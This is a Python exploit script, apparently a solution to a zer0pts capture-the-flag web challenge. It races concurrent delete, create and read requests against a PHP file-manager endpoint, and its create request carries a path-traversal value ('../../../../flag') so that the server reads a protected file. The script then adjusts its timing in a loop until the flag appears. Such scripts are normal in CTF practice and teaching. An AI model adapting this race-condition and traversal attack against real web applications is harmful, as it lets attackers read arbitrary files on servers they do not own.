# -*- coding: future_fstrings -*-
import requests, multiprocessing
from time import sleep, time

#URL = 'http://web.ctf.zer0pts.com:8001/'
URL = 'http://localhost:8080/'

def kill(s, t):
    sleep(t)
    begin = time()
    print('[KILL] killer sent')
    s.post(URL, data={'mode': 'delete', 'name': 'yeee'})
    print('[KILL] killer recv')
    return begin, time()

def race(s, t):
    sleep(t)
    begin = time()
    print('[RACE] racer sent')
    s.post(URL, data={'mode': 'create', 'name': 'yeee', 'type': '1', 'target': '../../../../flag'})
    print('[RACE] racer recv')
    return begin, time()

def read(s, t):
    sleep(t)
    begin = time()
    print('[READ] read sent!')
    res = s.post(URL, data={'mode': 'read', 'name': 'yeee'}).text
    print('[READ] read recv!')
    return begin, time(), res


if __name__ == '__main__':
    s1 = requests.Session()
    s1.cookies['PHPSESSID'] = '?'
    t1 = 0.1

    s2 = requests.Session()
    s2.cookies['PHPSESSID'] = '!'
    t2 = 0.6

    s3 = requests.Session()
    s3.cookies['PHPSESSID'] = '#'
    t3 = 0.1

    while True:
        print("[Info] delay")
        print(f"kill : {t1}")
        print(f"race : {t2}")
        print(f"read : {t3}")

        s3.post(URL, data={'mode': 'delete', 'name': 'yeee'})
        s3.post(URL, data={'mode': 'create', 'name': 'yeee'})
        s3.post(URL, data={'mode': 'write', 'name': 'yeee', 'data': 'YEET!' * 0x100})
        print('[MAIN] WROTE')

        print('[MAIN] start reader, killer and racer')
        pool_read = multiprocessing.Pool(processes=1)
        pool_kill = multiprocessing.Pool(processes=1)
        pool_race = multiprocessing.Pool(processes=1)
        reader = pool_read.apply_async(read, (s3, t3))
        killer = pool_kill.apply_async(kill, (s1, t1))
        racer = pool_race.apply_async(race, (s2, t2))

        kill1, kill2 = killer.get()
        race1, race2 = racer.get()
        read1, read2, res = reader.get()

        if not (read1 < kill1 and read1 < race1):
            print("[x] read starts too slow")
            t1 *= 1.05
            t2 *= 1.05
        if not (kill1 < race1):
            print("[x] race starts too fast")
            t2 *= 1.05
        if not (kill2 < race2):
            print("[x] kill ends too slow")
        if not (read2 < race2):
            print("[x] race ends too fast")
            t2 *= 1.05
        if (read2-race1 > race2-read2):
            print("[=] we need race1 ~= read2")
            t2 *= 1.01
        if not (race1 < read2):
            print("[x] race starts too slow")
            t2 *= 0.97
        
        
        if 'Contents of ' in res:
            if 'YEET!' in res:
                print('[M] YEET found')
            elif 'Contents of' in res:
                flag = res[res.find('<p class="card-text">'):res.find('</p>')]
                if flag == '<p class="card-text">':
                    print("[M] Empty")
                else:
                    print(f"[FLAG] {flag}")
                    break
            else:
                print('Empty??')
        elif 'file not found' in res:
            print('[M] File not found')
        else:
            print('???')
        print('sleeping a second...\n\n')
        sleep(1)
